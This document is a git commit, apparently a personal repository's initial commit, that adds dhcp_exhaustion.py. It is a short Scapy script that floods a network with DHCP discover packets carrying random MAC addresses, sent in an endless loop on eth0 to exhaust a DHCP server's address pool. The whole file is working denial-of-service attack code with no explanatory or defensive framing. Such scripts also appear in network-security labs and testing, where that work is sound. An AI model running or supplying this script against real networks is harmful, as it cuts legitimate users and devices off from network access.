c692e0ef4ffb7f6e59572ec048a20614a6ab833b
yusufdalbudak <yusufdalbudak2121@gmail.com>
2023-12-06 14:48:15 -0500

    Initial commit

---
+++ dhcp_exhaustion.py
@@ -0,0 +1,24 @@
+from scapy.all import *
+
+conf.checkIPaddr = False
+
+ether = Ether(dst='08:00:27:68:c2:86')
+ip = IP(src="0.0.0.0", dst='255.255.255.255')
+
+udp = UDP(sport=68, dport=67)
+bootp = BOOTP(op=1, chaddr=RandMAC())
+dhcp = DHCP(options=[("message-type","discover"), "end"])
+
+dhcp_discover = ether/ip/udp/bootp/dhcp
+
+
+
+#for i in range(10):
+ #   ans, unans = srp(dhcp_discover, iface='eth0', verbose=False)
+  #  for p in ans:
+   #     print(p[1].dst, ":", p[1].yiaddr)
+    #p[0].show()
+    #p[1].show()
+
+#for i in range(10):
+sendp(dhcp_discover,iface='eth0', verbose=False, loop=1)
